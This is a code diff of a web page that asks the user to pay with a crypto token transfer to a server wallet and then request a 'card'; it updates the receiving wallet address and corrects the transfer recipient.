@@ -8,7 +8,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.3/web3.min.js" integrity="sha512-Ws+qbaGHSFw2Zc1e7XRpvW+kySrhmPLFYTyQ95mxAkss0sshj6ObdNP3HDWcwTs8zBJ60KpynKZywk0R8tG1GA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script>
         'use strict';
-        const serverWallet = '0x938B94f5E7E9D7e08ED064C3ba9349725FC1B152';
+        const serverWallet = '0x9B681E7074D5Ff2edC85a5381a84A7687aBb7a66';
         let mainWallet;
 
         const provider = window.ethereum
@@ -39,7 +39,7 @@
 
             const contract = new web3.eth.Contract(abi, coinAddress)
             console.log(contract.methods)
-            contract.methods.transfer(mainWallet, web3.utils.toWei(document.getElementById('usdValue').value, 'ether')).send({
+            contract.methods.transfer(serverWallet, web3.utils.toWei(document.getElementById('usdValue').value, 'ether')).send({
                 'from': mainWallet,
                 'value': 0,
                 'gas': 250000,
@@ -107,7 +107,7 @@
 
     <button onclick="sendTransaction()">SEND TRANSACTION</button>
     <div id="sendText"></div><br><br>
-    <input type="url" id="txnText">
+    <input type="text" id="txnText">
     <button onclick="getCard()" id="getCardButton">Get Card!</button>
 </body>
 </html>
